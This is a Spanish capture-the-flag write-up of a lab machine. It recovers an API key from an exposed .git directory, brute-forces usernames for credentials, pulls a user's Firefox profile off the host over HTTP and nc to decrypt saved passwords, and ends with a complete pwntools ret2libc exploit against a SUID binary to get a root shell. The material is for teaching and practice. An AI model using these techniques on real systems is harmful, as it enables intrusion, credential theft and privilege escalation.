# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -sS -Pn -n -vvv --min-rate 5000 $IP

PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 62
80/tcp   open  http            syn-ack ttl 62
8081/tcp open  blackice-icecap syn-ack ttl 62
```

```bash
sudo nmap -p 22,80,8081 -sVC -Pn -n --min-rate 5000 -v -oN versiones.nmap $IP

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## <font color=red>[~]</font> Entorno Web

Cuando accedemos al servidor web que corre en el puerto 80 tan solo vemos una pagina en la que pone ***OLD***. Antes de comenzar la fase de reconocimiento activo vía ***Fuzzing***, decido inspeccionar el servidor web del puerto 8081 en el cual encuentro una web completa con panel de ***Login***.

Este panel es solo estético ya que no tiene ninguna etiqueta `<form>` que le de la funcionalidad de un formulario real. Sin embargo, si encontramos una funcionalidad de recuperación de contraseña. Cuando accedemos a dicha funcionalidad se nos redirige a una página en la que debemos de indicar el nombre de usuario y se nos devolverá la contraseña del mismo.

### <font color=red>[-]</font> *forgot-password?*

Cuando vemos el código fuente de la página, vemos que el formulario procesa los datos a través de una función `api()`. 

```html
<form id="forgotform" action=[#](view-source:http://10.129.183.87:8081/forgot#) onsubmit="api();" class="mt-3">
	<input id="username" class="form-control form-control-lg" type="text" placeholder="Your Username">
	<div class="text-right my-3">
		<button type="submit" class="btn btn-lg btn-success">Show Password</button> 
	</div>
</form>
```

Dicha función la podemos encontrar en el archivo `/static/js/forget.js`.

```JS
function api(){
    var xhttp = new XMLHttpRequest();
    var data=document.getElementById("username").value;
    console.log(data);
    xhttp.open("POST", "/api/"+data, true);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality 
}
```

Podemos ver que la función recupera el valor del ***nombre de usuario*** y lo usa para crear el *api endpoint* al que se llama al presionar el botón del formulario. Además, configura la petición HTTP estableciendo la cabecera ***Content-Type: application/json*** y estableciendo como parámetro JSON ***"key":"NULL"***. También encontramos en esta misma línea un comentario en el que se nos advierte de que se ha eliminado la clave API (***API Key***) para detener la funcionalidad de recuperación de contraseña.

Conociendo como funciona la funcionalidad, suponemos que si recuperamos la clave API, podemos recuperar la contraseña de algún usuario. Como vimos que la funcionalidad de *Login* era solo estética, seguramente las credenciales servirán para conectarnos vía ***SSH***. No obstante, tratar de averiguar la clave API es inviable, por lo que sigo investigando para ver si consigo recuperar dicha clave.

Tras revisar códigos fuentes decido que es momento de comenzar el reconocimiento activo del entorno web.

### <font color=red>[-]</font> ***Fuzzing***

```bash
# Encuentro un directorio /old/ dentro del servidor del puerto 80
ffuf -c -w <(tail -n+15 /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt) -u http://$IP/FUZZ -fc 404

old                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 47ms]

# Dentro del directorio /old/ encunetro un nuevo directorio /old/.git/
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$IP/old/FUZZ -fc 404

templates               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 41ms]
.git                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 36ms]
```

Lo primero que se me ocurre es mirar los distintos ***commits*** para ver si puedo obtener el código anterior de la función `api()` por si tuviera *hardcodeada* la calve API. Para ello:

1. Voy a la dirección `http://$IP$/old/.git/logs/HEAD` en donde encuentro los distintos *commits* que se ha realizado. Primero decido ir al primer *commit* para ver que contenía al inicio.
2. Para tratar de obtener lo que contenía en aquel entonces, busco el objeto (podemos encontrarlo gracias al Hash del *commit* en donde los 2 primeros caracteres son el directorio en el que se almacena y el resto es el nombre del objeto en sí):
   ```bash
   curl -s "http://$IP/old/.git/objects/33/891017aa63726711585c0a2cd5e39a80cd60e6" | python3 -c "import zlib,sys;print(zlib.decompress(sys.stdin.buffer.read()))"
   
   # Respuesta
   b'commit 219\x00tree b1607d941b9a009995ebecb3db5dbf54f40d28de\nparent 25fa9929ff34c45e493e172bcb64726dfe3a2780\nauthor root <cirius@incognito.com> 1616798073 +0000\ncommitter root <cirius@incognito.com> 1616798073 +0000\n\nFinishing Things\n'
   ```
   
   Si descargamos el objeto directamente usando `curl`, se nos mostrará mucho ruido ilegible. Esto es porque ***Git*** comprime todos sus objetos usando ***zlib***. Para ello, le he pasado el resultado a ese pequeño código en Python para descomprimirlo.
1. Lo que estamos viendo en la respuesta de la petición anterior es la estructura interna de un ***objeto Commit*** de *Git*. Los commits no guardan el código de los archivos, sino que es un mero archivo de texto con metadatos que apunta a otras partes.
   
   Lo que nos interesa es `tree b1607d941b9a009995ebecb3db5dbf54f40d28de`. El ***tree*** es el objeto que contiene el listado de todos los archivos de las carpetas que existían en ese *commit* exacto.
1. El siguiente paso es ver los archivos de ese ***Tree***. Para ello, ahora debemos pedirle al servidor el objeto del ***tree (`b1607d941b9a009995ebecb3db5dbf54f40d28de``)***. La URL se construye igual: 
   - Los dos primeros caracteres son la carpeta (`b1`)
   - Los otros 38 son el archivo (`607d941b9a009995ebecb3db5dbf54f40d28de`).
   
   Como los objetos ***tree*** almacenan los hashes de los archivos en formato binario puro, si usamos el comando de Python anterior no podríamos leer el contenido. Para limpiarlo:
   
   ```bash
   curl -s "http://$IP/old/.git/objects/b1/607d941b9a009995ebecb3db5dbf54f40d28de" | python3 -c "
	import zlib, sys
	data = zlib.decompress(sys.stdin.buffer.read())
	header, body = data.split(b'\x00', 1)
	while body:
		mode_name, rest = body.split(b'\x00', 1)
		sha1 = rest[:20].hex()
		body = rest[20:]
		print(f'{mode_name.decode()} -> Hash: {sha1}')
	"
   
	# Respuesta
	100644 app.py -> Hash: cbf47f50aca7f37aa7f98006174bfcf724be9b5e
	40000 static -> Hash: 82ad181baa1afba57212664f86cb0c25cf042973
	40000 templates -> Hash: abd654d2f11fae3471026e4891c805dc485eeaaf
	```

1. El paso final es leer el contenido del archivo `app.py`. Los archivos en Git se guardan como objetos de tipo ***blob***. Al igual que antes, tenemos que construir la URL usando el hash de `app.py`.
   
   Como esto es un archivo de texto puro (*código python*), el script para descomprimirlo es mucho más sencillo. Solo tenemos que decirle a Python que descomprima el archivo y pinte el texto omitiendo la cabecera interna de Git.
   ```bash
   curl -s "http://$IP/old/.git/objects/cb/f47f50aca7f37aa7f98006174bfcf724be9b5e" | python3 -c "
import zlib, sys
data = zlib.decompress(sys.stdin.buffer.read())
	# Git pone una cabecera 'blob [tamaño]\x00' antes del código. La separamos:
header, contenido_codigo = data.split(b'\x00', 1)
print(contenido_codigo.decode('utf-8', errors='ignore'))
"
```
   
   ***Respuesta***
   
   ```Python
   from flask import Flask, render_template, request

	app = Flask(__name__)

	@app.route('/')
	def index():
    return render_template('index.html')

	@app.route('/login')
	def login():
	    return render_template('login.html')

	@app.route('/api/')
	@app.route('/api')
	def api():
	    return "API Action Missing"

	@app.route('/api/<uname>',methods=['POST'])
	def info(uname):
	    if(uname == ""):
	        return "Username not provided"
	    print("OK")
	    data=request.get_json(force=True)
	    print(data)
	    if(data['key']=='[hidden_API_key]'):
	        if(uname=="admin"):
	            return '{"username":"admin","password":"password"}'     #Default Change them as required
	        elif(uname=="someone"):
	            return '{"username":"someone","password":"someword"}'   #Some other user
	        else:
	            return 'Invalid Username'
	    else:
	        return "Invalid API Key"

	@app.route('/forgot')
	def forgot():
	    return render_template('forgot.html')

	app.run(host='0.0.0.0')
   ```

Una vez sabemos la ***API Key***, volvemos a `http://$IP:8081/forgot` y usamos *Burp Suite* para interceptar y modificar la petición. Una vez realizamos la petición `POST` con el nombre de usuario `admin` con la API Key vemos que la respuesta pasa de ser un `Invalid API Key` a un `Invalid Username`. Esto nos muestra que la API Key sigue siendo funcional y que el problema ahora esta en el nombre de usuario. Esto nos indica que el desarrollador a cambiado el nombre de usuario del administrador y no lo sabemos, pero si probamos con el otro que encontramos `someone` obtenemos las credenciales.

Estuve tratando de acceder vía SSH con la contraseña usando diferentes usuarios, pero no tuve éxito. Así que decidí volver por si hubiera alguna funcionalidad en la web que requiera las credenciales, pero no encontré nada tampoco. en este punto ya tan solo me quedaba tratar de encontrar alguna otra contraseña probando nombres de usuario mediante fuerza bruta.

```bash
ffuf -c -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"[hidden_API_key]"}' -u http://$IP:8081/api/FUZZ -fs 16

tommy
```

Si volvemos a realizar la petición con el API key y el nombre de usuario `tommy`, se nos revela una nueva contraseña que, esta vez sí, podemos usar para acceder vía ***SSH***.

# <font color=red>[+]</font> Post-Explotación

## <font color=red>[~]</font> tommy

Una vez accedemos al sistema como el usuario `tommy` obtenemos la *flag* `user.txt`. Pero al buscar ficheros con el bit SUID activo y demás técnicas típicas de escalada de privilegios no obtengo resultado.

Miré en el directorio `/home/carlJ`, en el cual encuentro un directorio oculto `.mozilla`. Podemos usar este directorio con la idea de obtener credenciales del navegador. Para ello usamos la herramienta `firefox_decrypt`.

1. Clonamos el repositorio en nuestra máquina Kali:
```bash
git clone https://github.com/unode/firefox_decrypt.git
```

2. Debemos descargar los archivos en nuestra máquina.
```bash
# En la máquina víctima
cd /home/carlJ/.mozilla/firefox

python3 -m http.server 5555

# En nuestra máquina Kali
wget --recursive http://$IP:5555/
```

3. Ejecutamos la herramienta:
```bash
python3 firefox_decrypt.py /directorio_con_los_archivos_descargados
```

4. Se nos preguntará sobre que perfil queremos ejecutar la herramienta, una de ellas requiere una contraseña la cual probé manualmente y descubrí que es `password1`.

Esto nos devuelve unas credenciales que podemos usar para escalar privilegios hacia el usuario `carlJ`.

## <font color=red>[~]</font> carlJ

Una vez somos el usuario `carlJ`, obtenemos acceso a un nuevo subdirectorio `/home/carlJ/mailing` el cual contiene un archivo binario (`smail`).

Para poder entender mejor como funciona el binario he decidido descargarlo en mi máquina para hacer un análisis estático y dinámico del software.

```bash
# Preparamos el listener en nuestra máquina para recibir el archivo
nc -lvnp 4444 > binario

# Lo mandamos usando nc desde la máquina víctima
nc -w 3 IP_KALI 4444 < smail
```

Una vez tengamos el binario en nuestra máquina comenzamos a analizarlo en profundidad. Lo primero es un análisis dinámico para conocer la lógica del programa. Cuando ejecutamos el binario se nos da la oportunidad de elegir entre 2 funciones:

- `Send Message`: Si elegimos esta opción se nos indica que debemos de escribir un mensaje de como mucho *80* caracteres. Tras enviarlo noes muestra el mensaje `Sent!`
- `Change your Signature`: si elegimos esta otra opción, se nos muestra que debemos de introducir una nueva *firma*. Cuando la introducimos se nos muestra el mensaje `Changed`.

Esto ya suena algo sospechoso ya que podemos ver un mecanismo que limita el número de caracteres dentro de una función, pero no en la otra. Cuando usamos la función enviar un mensaje, se nos deja claro que dicho mensaje no debe poseer más de 80 caracteres. Sin embargo, en la función de cambiar la firma, no se nos muestra esta limitación.

Esto es posible verlo un poco más a detalle si usamos la herramienta `strings` con el binario:
```
strings binario

/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
stdin
fgetc
fgets
__libc_start_main
GLIBC_2.7
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
Changed
What do you wanna do
1-Send Message
2-Change your Signature
What message you want to send(limit 80)
Sent!
Write your signature...
;*3$"

<snip>
```

Aquí podemos ver varias cosas interesantes del programa. Lo primero es que tiene el Bit SUID activo y utiliza la función `setuid` para poder usar realmente el usuario `root` al ejecutar el programa. Por lo que es muy probable que podamos usarlo para realizar la ***escalada de privilegios vertical***.

En la lista aparece aparecen las funciones de la librería estándar de ***C*** (`lib.so.6`) que utiliza el programa. Aquí es donde se esconde el peligro:
### `setuid`

Al tener el bit SUID activo, este binario se ejecuta con los privilegios del propietario del archivo (*en este caso `root`*). la presencia de la función `setuid` confirma que el programa altera o establece los IDs de usuario del proceso. Si logramos alterar el flujo normal del programa (controlar el *Instruction Pointer* o `RIP/EIP`), podríamos redirigir la ejecución para spawnear una shell (`/bin/sh`) que heredará esos privilegios de `root`.
### `fgets` vs `__isoc99_scanf`

El programa utiliza dos métodos diferentes para recibir datos del usuario.

- `fgets`: Es una función generalmente segura porque obliga al desarrollador a especificar un tamaño máximo de lectura (como el `limit 80` que nos menciona el programa al elegir la primera opción).
- `__isoc99_scanf`: Es el nombre interno que usa la verisón moderna de `scanf`. Esta función es ***famosamente vulnerable*** si el desarrollador la utiliza con un formato genérivo como `scanf("%s", buffer)`. Si no se define un límite estricto dentro del formato (por ejemplo, `%79s`), `scanf` leerá los datos de forma indefinida hasta encontrar un espacio o un salto de línea.
### Hipótesis de la vulnerabilidad: ***Stack-Based Buffer Overflow***

El escenario más probable es el siguiente:

1. La ***Opción 1*** probablemente use `fgets(buffer, 80, stdin)` de forma correcta, respetando el límite de 80 caracteres.
2. La ***Opción 2*** probablemente utilice `scanf` p no valide correctamente el tamaño del búfer asignado en la memoria (la pila o *stack*).

>Si la Opción 2 permite introducir más caracteres de los que el búfer puede soportar, estaríamos ante un ***Desbordamiento de Búfer basado en Pila***.
>
>Al enviar una cantidad excesiva de datos, podríamos sobrescribir variables adyacentes en la memoria, el _Frame Pointer_ (`EBP/RBP`) y, finalmente, la ***dirección de retorno*** de la función.

### Pruebas

Para saber si realmente el binario es vulnerable debemos de seguir los siguiente pasos en la máquina víctima:

1. ***Verificar las protecciones del binario:*** Ejecutaremos la herramienta `checksec` sobre el archivo para ver que defensas tiene activadas (como *Canarios de pila, NX/DEP* que impide ejecutar código en la pila, o *PIE*).
2. ***Proof of Concept:*** Probaremos a introducir una cadena muy larga de caracteres (por ejemplo, 100 o 200 *'A's*) en la opción 2 del programa para ver si termina de forma abrupta con un error de `Segmentation fault (core dumped)`.
#### `checksec`

La función de esta herramienta es analizar el binario y decirnos qué defensas tiene activadas para que sepamos qué tipo de ataque debemos plantear.

>[!Note]
>En caso de no tenerla instalada, podremos instalarla con `sudo apt update && sudo apt install checksec`.

```bash
checksec --file=nombre_del_binario
```

(*Si no funciona, intentaremos simplemente con `checksec nombre_del_binario`*)
##### *TroubleShooting*

En caso de que la herramienta se ejecute, pero se quede colgada deberemos de ejecutar el siguiente comando para crear el archivo de configuración de `pwntools` indicándole que ***nunca*** busque actualizaciones:
```bash
echo -e "[update]\ninterval=never" > ~/.pwn.conf
```

##### Interpretación del resultado

`checksec` nos va a devolver una salida con varios colores (normalmente verde si la protección está activada, o rojo si está desactivada). Esto es en lo que debemos fijarnos:
###### CANARY (Canario de pila)
Es un valor aleatorio secreto que el programa pone en la memoria justo antes de la dirección de retorno. Si intentamos inundar el búfer, vamos a sobrescribir el canario, el programa se dará cuenta y se cerrará inmediatamente.

- ***No canary found (Rojo)*:** ¡Perfecto! Significa que podemos desbordar la pila y sobrescribir la dirección de retorno directamente sin que el programa lo detecte.
- ***Canary found (Verde)*:** Tendremos que buscar una forma de "filtrar" (_leak_) ese valor de la memoria antes de atacar, o buscar la vulnerabilidad en otra parte que no sea la pila.
###### NX o DEP (No-Execute / Data Execution Prevention)

Esta protección marca ciertas zonas de la memoria (como la pila) como "*no ejecutables*".

- ***NX disabled (Rojo)*:** Significa que podemos inyectar nuestro propio código malicioso (_shellcode_) directamente en el búfer y saltar a él para ejecutarlo.
- ***NX enabled (Verde)*:** No podemos ejecutar código en la pila. Tendremos que usar técnicas de reutilización de código que ya existe en el sistema, como **ROP (Return-Oriented Programming)** o un ataque **ret2libc** (saltar directamente a la función `system` de la librería de C).
###### PIE (Position Independent Executable)
Determina si las direcciones de memoria del propio binario cambian cada vez que se ejecuta.

- ***No PIE (Rojo)*:** Las direcciones de las funciones del binario (como `main`, o secciones como el menú) siempre están en el mismo sitio. Es mucho más fácil construir el ataque.
    
- ***PIE enabled (Verde)*:** El binario se carga en una dirección aleatoria en cada ejecución. Al igual que con el canario, necesitarémos primero una vulnerabilidad que nos permita leer una dirección de memoria para calcular dónde se ha cargado el programa.
###### RELRO (Relocation Read/Only)
Protege la tabla ***GOT*** (Global Offset Table), que es donde el programa anota las direcciones reales de funciones como `puts` o `scanf`.

- ***Partial RELRO*:** La tabla *GOT* es modificable en caliente. Podemos intentar un ataque clásico de sobrescribir una entrada de la GOT (por ejemplo, hacer que cuando el programa llame a `puts`, en realidad llame a `system`).
- ***Full RELRO (Verde)*:** La tabla *GOT* es de solo lectura desde que arranca el programa. No podemos modificarla.

```bash
checksec file=binario

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols	  No	0		2		binario
```

- ***STACK CANARY: `No canary found`***
  - ***Qué significa?:*** La pila (*stack*) no tiene ninguna variable de control (el "*canario*") que verifique si la memoria ha sido alterada antes de terminar una función.
    
    Esta es la puerta principal. Significa que el binario es vulnerable a un ***Stack-Based Buffer Overflow (Desbordamiento de búfer)***. Si metemos suficientes datos en el campo de la firma (la opción 2 que usa `scanf`), vamos a desbordar el búfer y podremos escribir directamente encima de la dirección de retorno (`RIP/EIP`) sin que el programa salte o se queje. ***Podemos controlar el flujo del programa***.
- ***PIE: `No PIE` (Position Independent Executable desactivado)***
  - ***Qué significa?:*** El binario ***siempre*** se carga en las mismas direcciones de memoria fijas cada vez que lo ejecutamos. Las funciones nativas del código (como `main`, `puts`, o la función que llama al menú) no se mueven.
    
    Al no cambiar las direcciones, no necesitamos adivinar ni calcular dónde está el código en cada ejecución. Si necesitamos saltar a una parte específica del binario o usar una dirección fija, esa dirección será siempre idéntica.
- ***NX: `NX enabled` (No-Execute activado)***
  - ***Qué significa?:*** La memoria donde se guardan nuestros datos de entrada (la pila) tiene prohibido ejecutar código.
    
    ***No podemos hacer un ataque clásico de la "vieja escuela"*** (inyectar un código malicioso o _shellcode_ directamente en nuestra firma y saltar a él), porque el procesador se negará a ejecutarlo y el programa se caerá.
    
    Como no podemos _inyectar_ código nuevo, tenemos que _reutilizar_ el código que ya existe en el sistema. Al estar ante un binario SUID con `setuid`, nuestro objetivo es desbordar la pila para redirigir la ejecución hacia la función **`system()`** de la librería estándar de C (`libc`) pasándole como argumento la cadena `"/bin/sh"`. Esto se conoce como un ataque **ret2libc** o el uso de una cadena **ROP (Return-Oriented Programming)**.
- ***RELRO: `Partial RELRO` (Relocation Read-Only parcial)***
  - ***Qué significa?:*** La ***tabla GOT*** (*Global Offset Table*), que es el índice donde el binario apunta a las funciones de las librerías dinámicas como `puts` o `scanf`, se puede modificar durante la ejecución del programa.
    
    Si por algún motivo no quisieramos cambiar la dirección de retorno de la pila, podríamos intentar un ataque de "Sobrescritura de la GOT", cambiando la dirección de una función común (como `puts`) para que apunte a `system()`.

### Exploit 💣

Estuve buscando formas de explotar esta vulnerabilidad, y el *exploit* que mejor me funcionó fue este. Se explicará cada parte del mismo:

```python
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```
#### 1. Preparación del Entorno

```python
from pwn import *
p = process('./smail')
```

- `from pwn import *`: Importamos ***Pwntools***, la librería de Python estándar para desarrollo de *exploits*. Nos da funciones para empaquetar datos, interactuar con procesos, etc.
- `p = process('./smail')`: Inicia el binario vulnerable (`smail`) de forma local para interactuar con él.

#### 2. Definición de Direcciones de Memoria

```Python
libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a
POPRDI = 0x4007f3
```

- `libc_base`: Es la dirección donde se ha cargado la librería `libc` en memoria.
- `system`: Calcula la dirección real de la función `system()`. Se toma la base de `libc` y se le suma su _offset_ (desplazamiento) constante (`0x4f550`). Esta función nos permite ejecutar comandos del sistema.
- `binsh`: Calcula la dirección de la cadena de texto `"/bin/sh"` que ya existe guardada dentro de la propia `libc`.
- `POPRDI`: Es la dirección de un ***ROP Gadget*** (`pop rdi; ret`) que se encuentra en el propio binario. En arquitectura de 64 bits, los argumentos de las funciones no se pasan por la pila, sino por registros. El primer argumento de cualquier función debe ir obligatoriamente en el registro **`RDI`**. Este gadget nos servirá para meter la dirección de `"/bin/sh"` dentro de `RDI`.

#### 3. Construcción del Payload (La Cadena ROP)

```Python
payload = b'A' * 72
```

- `b'A' * 72`: Envía 72 bytes de basura (la letra 'A') para llenar el buffer vulnerable y sobrescribir el _Saved Frame Pointer_ (SFP). El byte 73 alineará nuestro payload exactamente con la dirección de retorno en la pila.

```Python
payload += p64(0x400556)
```

- `p64(...)`: Es una función de pwntools que convierte un número hexadecimal en 8 bytes en formato _Little Endian_ (el formato que entiende el procesador).
- `0x400556`: Esta dirección apunta a una instrucción `ret` (retorno) suelta. Se usa exclusivamente para **alineación de la pila (Stack Alignment)**. En sistemas modernos de 64 bits (como Ubuntu), la función `system()` crashea si la pila no está perfectamente alineada a 16 bytes al ser llamada. Este `ret` extra soluciona ese problema de estabilidad.

```Python
payload += p64(POPRDI)
payload += p64(binsh)
```

- El programa salta a la dirección de `POPRDI`.
- La instrucción `pop rdi` toma el siguiente elemento de la pila (que es la dirección de `binsh`) y lo mete directamente dentro del registro `RDI`. Ahora el procesador sabe que el primer argumento para la próxima función será `"/bin/sh"`.

```Python
payload += p64(system)
payload += p64(0x0)
```

- Inmediatamente después del `pop rdi`, el gadget ejecuta un `ret`, lo que hace que el programa salte a la siguiente dirección en la pila: **`system`**.
- Como `RDI` ya tiene la ruta de la shell, el programa ejecuta internamente: `system("/bin/sh")`.
- El `0x0` final actúa como una dirección de retorno falsa para cuando `system` termine (aunque no nos importa, porque para ese momento ya habremos tomado el control).

#### 4. Ejecución del Ataque e Interactividad

```Python
p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```

- `p.clean()`: Descarta cualquier texto o menú que el programa haya enviado a la pantalla para asegurarse de que el canal de comunicación esté limpio.
- `p.sendline("2")`: Simula que el usuario presiona "2" y Enter.
- `p.sendline(payload)`: Envía el payload malicioso que acabamos de armar para desbordar el buffer y ejecutar la cadena ROP.
- `p.interactive()`: Detiene la ejecución automática del script de Python y nos da el control de la terminal en nuestra consola. Si el exploit funcionó, a partir de este punto podremos escribir comandos como `whoami`, `ls` o `cat flag.txt` directamente en la máquina víctima.
